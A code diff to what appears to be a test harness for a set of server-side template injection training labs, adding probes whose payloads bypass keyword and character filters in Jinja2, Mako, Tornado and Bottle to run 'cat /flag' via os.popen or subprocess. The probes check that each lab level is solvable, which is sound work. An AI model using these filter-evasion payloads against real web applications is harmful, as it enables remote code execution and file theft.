@@ -201,6 +201,21 @@ LABS: list[Lab] = [
                 FLAG_TMPL % "02",
                 note="L10 前缀置空不影响 lipsum 链",
             ),
+            # ---- L12 强字符集（原「无已知解」关卡；本关没禁 request 与数字）
+            RenderCheck("11", "{{ '_' }}", "WAF", note="L12 含 _ 被拦"),
+            RenderCheck(
+                "11",
+                "{%set r=request|attr(dict(args=true)|first)|attr(dict(get=true)|first)%}"
+                "{{lipsum|attr(r(dict(a=true)|first))|attr(r(dict(b=true)|first))"
+                "(r(dict(c=true)|first))|attr(r(dict(d=true)|first))(r(dict(e=true)|first))"
+                "|attr(r(dict(f=true)|first))()}}",
+                FLAG_TMPL % "02",
+                note="L12 属性名全部从 request.args 带入（无引号/下划线/数字）",
+                query={
+                    "a": "__globals__", "b": "get", "c": "os", "d": "popen",
+                    "e": "cat /flag", "f": "read",
+                },
+            ),
         ],
     ),
     Lab(
@@ -217,6 +232,30 @@ LABS: list[Lab] = [
                 FLAG_TMPL % "03",
                 note="L2 用代码块绕过",
             ),
+            # ---- L11 组合过滤 / L12 强字符集 / L13 扩展关键字（原「无已知解」关卡）
+            RenderCheck(
+                "10",
+                "${getattr(getattr(__import__(min(dict(os=1))),min(dict(popen=1)))"
+                "(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),"
+                "min(dict(read=1)))()}",
+                FLAG_TMPL % "03",
+                note="L11 __import__ + min(dict(kw)) + str(bytes,'utf8') 造串",
+            ),
+            RenderCheck(
+                "11",
+                "${getattr(open(chr((True+True+True+True)*(True+True+True+True+True+True"
+                "+True+True+True+True+True+True)-True)+min(dict(flag=True))),"
+                "min(dict(read=True)))()}",
+                FLAG_TMPL % "03",
+                note="L12 True 算术凑 chr(47) + dict(flag) 键名拼出 /flag",
+            ),
+            RenderCheck(
+                "12",
+                "<% from subprocess import getoutput %>"
+                "${getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}",
+                FLAG_TMPL % "03",
+                note="L13 代码块 from-import + str(bytes) 造串",
+            ),
         ],
     ),
     Lab(
@@ -231,12 +270,38 @@ LABS: list[Lab] = [
                 FLAG_TMPL % "04",
                 note="Tornado {% import %} 直接 RCE",
             ),
-            RenderCheck("1", "{{ 7*7 }}", "WAF", note="L2 命中 {{ 被拦"),
+            # ---- L2 拦截 open（原设计拦 {{ 等于拿掉回显通道，属设计缺陷，已按
+            #      docs/SOLVABILITY.md 2.1 的建议改为拦可绕过的关键词）
+            RenderCheck("1", "{{ 7*7 }}", "49", note="L2 拦 open 不影响普通表达式"),
+            RenderCheck("1", "{{ open('/flag') }}", "WAF", note="L2 命中子串 open 被拦"),
             RenderCheck(
                 "1",
-                "{% import os %}{% set _ = os.system('true') %}OK",
-                "OK",
-                note="L2 语句块仍可用（{% import %} 直接导入模块）",
+                "{{__import__('subprocess').getoutput('cat /flag')}}",
+                FLAG_TMPL % "04",
+                note="L2 换 gadget：__import__ + getoutput（不含 open）",
+            ),
+            # ---- L11 组合过滤 / L12 强字符集 / L13 扩展关键字（原「无已知解」关卡）
+            RenderCheck(
+                "10",
+                "{% import os %}{{getattr(getattr(os,min(dict(popen=1)))"
+                "(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),"
+                "min(dict(read=1)))()}}",
+                FLAG_TMPL % "04",
+                note="L11 min(dict(kw)) 取属性名 + str(bytes) 造命令",
+            ),
+            RenderCheck(
+                "11",
+                "{% import os %}{{getattr(open(getattr(os,min(dict(sep=True)))"
+                "+min(dict(flag=True))),min(dict(read=True)))()}}",
+                FLAG_TMPL % "04",
+                note="L12 True 算术 + os.sep + dict(flag) 键名拼出 /flag",
+            ),
+            RenderCheck(
+                "12",
+                "{% from subprocess import getoutput %}"
+                "{{getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}}",
+                FLAG_TMPL % "04",
+                note="L13 {% from %} 语句 + str(bytes) 造串",
             ),
         ],
     ),
@@ -365,6 +430,53 @@ LABS: list[Lab] = [
                 "/theme/thymeleaf", {"theme": "__${7*7}__"},
                 expect_status=500, expect_absent="49",
                 note="对照案例：Thymeleaf 模板名在本栈上不求值（500=视图名找不到，且响应里没有 49）",
+            ),
+        ],
+    ),
+    Lab(
+        key="09",
+        name="09-bottle-chain",
+        image="ssti-bottle-chain:local",
+        probes=[
+            RenderCheck("0", "{{7*7}}", "49", note="L1 基础求值"),
+            RenderCheck(
+                "0",
+                "{{open('/flag').read()}}",
+                FLAG_TMPL % "09",
+                note="L1 内置函数直读 /flag（Bottle 是编译型引擎）",
+            ),
+            # ---- L2 拦截 {{：代码块里的模板输出原语就是回显通道
+            RenderCheck("1", "{{ 7*7 }}", "WAF", note="L2 命中 {{ 被拦"),
+            RenderCheck("1", "<% _printlist((str(7*7),),) %>\n", "49", note="L2 用 _printlist 绕过"),
+            RenderCheck(
+                "1",
+                "<% _stdout.append(open('/flag').read()) %>\n",
+                FLAG_TMPL % "09",
+                note="L2 _stdout 写输出读 /flag",
+            ),
+            # ---- L11 组合过滤 / L12 强字符集 / L13 扩展关键字
+            RenderCheck(
+                "10",
+                "{{getattr(getattr(__import__(min(dict(os=1))),min(dict(popen=1)))"
+                "(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),"
+                "min(dict(read=1)))()}}",
+                FLAG_TMPL % "09",
+                note="L11 min(dict(kw)) 取属性名 + str(bytes) 造命令",
+            ),
+            RenderCheck(
+                "11",
+                "{{getattr(open(chr((True+True+True+True)*(True+True+True+True+True+True"
+                "+True+True+True+True+True+True)-True)+min(dict(flag=True))),"
+                "min(dict(read=True)))()}}",
+                FLAG_TMPL % "09",
+                note="L12 True 算术凑 chr(47) + dict(flag) 键名拼出 /flag",
+            ),
+            RenderCheck(
+                "12",
+                "<% from subprocess import getoutput %>\n"
+                "{{getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}}",
+                FLAG_TMPL % "09",
+                note="L13 代码块 from-import + str(bytes) 造串（%> 后必须换行）",
             ),
         ],
     ),
